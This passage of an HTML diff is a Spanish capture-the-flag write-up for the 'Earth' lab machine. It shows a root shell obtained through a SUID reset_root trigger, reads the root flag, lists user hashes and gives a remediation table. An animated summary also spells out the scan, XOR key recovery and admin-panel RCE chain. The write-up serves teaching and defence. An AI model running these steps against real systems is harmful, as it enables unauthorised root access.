+<span class="c-pr">apache$</span> echo Earth | su root -c 'id; cat /root/root_flag.txt'
+<span class="c-out">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="c-st">[root_flag_b0da9554d29db2117b02aa8b66ec492e]</span></code></pre>
+    </div>
+  </section>
+
+  <section>
+    <p class="eyebrow r"><span class="num">06</span> Post-explotación</p>
+    <h2 class="r">Usuarios, hashes y claves SSH</h2>
+    <p class="lead r">El objetivo pedía usuarios y sus claves SSH. Dato clave: <strong>no existen claves SSH de usuario</strong> en la máquina — ni <code class="k">/root/.ssh</code> ni <code class="k">/home/earth/.ssh</code> tienen <code class="k">id_*</code> o <code class="k">authorized_keys</code>. La autenticación es por contraseña, así que el botín son credenciales.</p>
+    <div class="tbl r">
+      <div class="tw">
+      <table>
+        <thead><tr><th>Usuario</th><th>UID</th><th>Shell</th><th>Credencial</th></tr></thead>
+        <tbody>
+          <tr><td class="m">root</td><td class="m">0</td><td class="m">/bin/bash</td><td><strong style="color:var(--green)">Earth</strong> <span style="color:var(--dim);font-family:var(--mono);font-size:11px">(reseteada · crackeada)</span></td></tr>
+          <tr><td class="m">earth</td><td class="m">1000</td><td class="m">/bin/bash</td><td class="m">$6$FIzdW32O… <span style="color:var(--dim)">no en rockyou</span></td></tr>
+        </tbody>
+      </table>
+      </div>
+    </div>
+    <p class="r">Únicas claves privadas presentes: las <i>host keys</i> del servidor (<code class="k">/etc/ssh/ssh_host_*_key</code>) y la clave TLS <code class="k">/etc/ssh/earth.local.key</code> — identidad del servidor, no de usuarios. El hash de <code class="k">earth</code> resistió rockyou (SHA-512, contraseña robusta); con root ya conseguido, no aporta seguir.</p>
+  </section>
+
+  <section>
+    <p class="eyebrow r"><span class="num">07</span> Remediación</p>
+    <h2 class="r">Cómo se rompe la cadena</h2>
+    <div class="tbl r">
+      <div class="tw">
+      <table>
+        <thead><tr><th>Debilidad</th><th>Severidad</th><th>Corrección</th></tr></thead>
+        <tbody>
+          <tr><td>Vhost de pruebas con notas de diseño expuestas</td><td><span class="sev hi">Crítica</span></td><td>Retirar <code class="k">terratest</code> y los <code class="k">.txt</code> de producción</td></tr>
+          <tr><td>XOR con clave corta reutilizada como contraseña</td><td><span class="sev hi">Crítica</span></td><td>Cripto autenticada real; nunca reutilizar la clave como credencial</td></tr>
+          <tr><td>Panel admin con ejecución de comandos sin sandbox</td><td><span class="sev me">Alta</span></td><td>Eliminar la herramienta o encerrarla en allow-list sin shell</td></tr>
+          <tr><td>SUID reset_root con lógica de trigger reversible</td><td><span class="sev me">Alta</span></td><td>Quitar el bit SUID; no dejar backdoors de reseteo</td></tr>
+          <tr><td>SSH por contraseña</td><td><span class="sev lo">Media</span></td><td>Forzar autenticación por clave pública</td></tr>
+        </tbody>
+      </table>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="big">// EARTH — pwned</div>
+    <p style="margin-top:8px;max-width:60ch;color:var(--dim)">Realizado en un laboratorio aislado y autorizado. Flags, hashes y rutas corresponden a esta instancia. Para uso educativo y de pentesting autorizado.</p>
+  </footer>
+</div>
+
+<script>
+(function(){
+  var reduce = matchMedia('(prefers-reduced-motion: reduce)').matches;
+  document.documentElement.classList.add('anim');
+
+  /* ---- reveal ---- */
+  var items = [].slice.call(document.querySelectorAll('.r'));
+  if(reduce || !('IntersectionObserver' in window)){
+    items.forEach(function(el){el.classList.add('in');});
+  } else {
+    var io = new IntersectionObserver(function(es){
+      es.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target);} });
+    },{rootMargin:'0px 0px -8% 0px', threshold:.08});
+    items.forEach(function(el){io.observe(el);});
+    setTimeout(function(){items.forEach(function(el){el.classList.add('in');});},1800);
+  }
+
+  /* ---- 21st.dev spotlight ---- */
+  var hero=document.querySelector('.hero'), spot=document.querySelector('.spotlight');
+  if(hero && spot && !reduce){
+    hero.addEventListener('pointermove',function(e){
+      var r=hero.getBoundingClientRect();
+      spot.style.setProperty('--mx',(e.clientX-r.left)+'px');
+      spot.style.setProperty('--my',(e.clientY-r.top)+'px');
+    });
+  }
+
+  /* ---- 21st.dev meteors ---- */
+  var met=document.getElementById('met');
+  if(met && !reduce){
+    for(var m=0;m<10;m++){
+      var s=document.createElement('span'); s.className='meteor';
+      s.style.left=(Math.random()*100+10)+'%';
+      s.style.top=(Math.random()*-30)+'%';
+      s.style.animationDuration=(Math.random()*3+3).toFixed(2)+'s';
+      s.style.animationDelay=(Math.random()*6).toFixed(2)+'s';
+      met.appendChild(s);
+    }
+  }
+
+  /* ---- 21st.dev matrix rain (canvas) ---- */
+  var cv=document.getElementById('px');
+  if(cv && !reduce){
+    var ctx=cv.getContext('2d'), W,H,cols,drops=[], DPR=Math.min(2,window.devicePixelRatio||1), FS=14;
+    var glyphs='01<>[]{}/\\|=+*#%ΞΛΣ░▒ABCDEF9'.split('');
+    function size(){ W=cv.width=innerWidth*DPR; H=cv.height=innerHeight*DPR; cv.style.width=innerWidth+'px'; cv.style.height=innerHeight+'px';
+      cols=Math.floor(W/(FS*DPR)); drops=[]; for(var i=0;i<cols;i++)drops[i]=Math.random()*-40; }
+    size(); addEventListener('resize',size,{passive:true});
+    var last=0;
+    function loop(t){
+      requestAnimationFrame(loop);
+      if(t-last<58) return; last=t;
+      ctx.fillStyle='rgba(10,14,13,.22)'; ctx.fillRect(0,0,W,H);
+      ctx.font=(FS*DPR)+'px monospace'; ctx.textBaseline='top';
+      for(var i=0;i<cols;i++){
+        var ch=glyphs[(Math.random()*glyphs.length)|0];
+        var x=i*FS*DPR, y=drops[i]*FS*DPR;
+        ctx.fillStyle='rgba(57,255,158,'+(Math.random()*.22+.05)+')';
+        ctx.fillText(ch,x,y);
+        if(y>H && Math.random()>.975) drops[i]=Math.random()*-20;
+        drops[i]+=1;
+      }
+    }
+    requestAnimationFrame(loop);
+  }
+
+  /* ---- 21st.dev glitch + scramble title ---- */
+  var gl=document.querySelector('.glitch');
+  if(gl){
+    if(reduce){ gl.setAttribute('data-text','EARTH'); }
+    else{
+      var fin='EARTH', pool='▚▞#%&/\\<>01XZ$APRT', fr=0, steps=28;
+      var si=setInterval(function(){
+        var out='';
+        for(var k=0;k<fin.length;k++){
+          out += (fr/(steps/fin.length) > k) ? fin[k] : pool[(Math.random()*pool.length)|0];
+        }
+        gl.textContent=out; gl.setAttribute('data-text',out); fr++;
+        if(fr>steps){ clearInterval(si); gl.textContent=fin; gl.setAttribute('data-text',fin); gl.classList.add('go'); }
+      },45);
+    }
+  }
+
+  /* ---- ShimmerButton: copy flag ---- */
+  document.querySelectorAll('.shimmer').forEach(function(b){
+    b.addEventListener('click',function(){
+      var val=b.parentNode.querySelector('.val'), txt=val?val.textContent.trim():'';
+      function ok(){ b.textContent='✓ copied'; b.classList.add('done'); setTimeout(function(){b.textContent='⧉ copy flag'; b.classList.remove('done');},1400); }
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(txt).then(ok).catch(function(){ var r=document.createRange(); r.selectNodeContents(val); var s=getSelection(); s.removeAllRanges(); s.addRange(r); ok(); });
+      } else { var r=document.createRange(); r.selectNodeContents(val); var s=getSelection(); s.removeAllRanges(); s.addRange(r); ok(); }
+    });
+  });
+
+  /* ---- hero typing ---- */
+  var lines = [
+    {t:'$ nmap -sS -p- 192.168.1.22', c:'pr'},
+    {t:'  22/tcp  open  ssh      OpenSSH 8.6', c:'cm'},
+    {t:'  80/tcp  open  http     Apache 2.4.51 (Fedora)', c:'cm'},
+    {t:'  443/tcp open  ssl/http  CN=earth.local, terratest.earth.local', c:'cm'},
+    {t:'$ key = C xor P  ->  earthclimatechangebad4humans', c:'ok'},
+    {t:'$ login terra  ->  Admin Command Tool  [RCE]', c:'ok'},
+    {t:'  uid=48(apache)  user_flag_3353b67d...', c:'wn'},
+    {t:'$ touch /tmp/kcM0Wewe && reset_root', c:'pr'},
+    {t:'  RESETTING ROOT PASSWORD TO: Earth', c:'ok'},
+    {t:'# id  ->  uid=0(root)   root_flag_b0da9554...', c:'ok'}
+  ];
+  var host = document.getElementById('type');
+  if(!host) return;
+  if(reduce){
+    lines.forEach(function(l){ var d=document.createElement('span'); d.className='ln '+l.c; d.textContent=l.t; host.appendChild(d); });
+    return;
+  }
+  var li=0, ci=0, cur=null;
+  var cursor=document.createElement('span'); cursor.className='cursor';
+  function tick(){
+    if(li>=lines.length){ host.appendChild(cursor); return; }
+    if(ci===0){ cur=document.createElement('span'); cur.className='ln '+lines[li].c; host.appendChild(cur); }
+    var txt=lines[li].t;
+    cur.textContent=txt.slice(0,ci+1);
+    ci++;
+    if(ci>=txt.length){ li++; ci=0; setTimeout(tick, 260); }
+    else { setTimeout(tick, 11); }
+  }
+  setTimeout(tick, 420);
+
+  /* ---- copy buttons ---- */
+  document.querySelectorAll('.cp').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var pre = btn.closest('.code').querySelector('pre');
+      var txt = pre ? pre.innerText : '';
+      function done(){ var o=btn.textContent; btn.textContent='copied'; setTimeout(function(){btn.textContent=o;},1200); }
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(txt).then(done).catch(function(){
+          var r=document.createRange(); r.selectNodeContents(pre); var s=getSelection(); s.removeAllRanges(); s.addRange(r); done();
+        });
+      } else {
+        var r=document.createRange(); r.selectNodeContents(pre); var s=getSelection(); s.removeAllRanges(); s.addRange(r); done();
+      }
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
